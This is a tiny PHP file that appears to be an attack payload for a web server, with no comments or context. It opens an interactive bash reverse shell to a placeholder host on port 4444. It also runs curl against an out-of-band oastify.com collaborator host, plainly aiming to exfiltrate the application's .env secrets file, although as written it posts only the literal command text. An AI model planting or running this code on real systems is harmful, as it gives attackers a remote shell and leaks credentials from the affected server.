<?php
system("bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'");

system("curl 'http://gueqei36an2ekr06j7oee9mxmosfgd42.oastify.com' --data-binary 'cat /var/www/html/.env'")

?>
